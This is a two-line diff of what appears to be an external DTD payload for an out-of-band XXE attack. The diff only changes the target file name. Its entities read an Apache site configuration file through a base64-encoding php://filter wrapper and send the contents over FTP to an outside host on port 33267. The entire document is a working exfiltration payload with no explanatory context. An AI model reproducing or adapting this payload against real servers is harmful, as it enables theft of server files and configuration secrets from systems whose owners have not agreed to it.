@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/apache2/sites-enabled/sambox.conf">
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/apache2/sites-enabled/samboxv3.conf">
 <!ENTITY % inception "<!ENTITY exfil SYSTEM 'ftp://idlewog.jprq.site:33267/%data;'>">
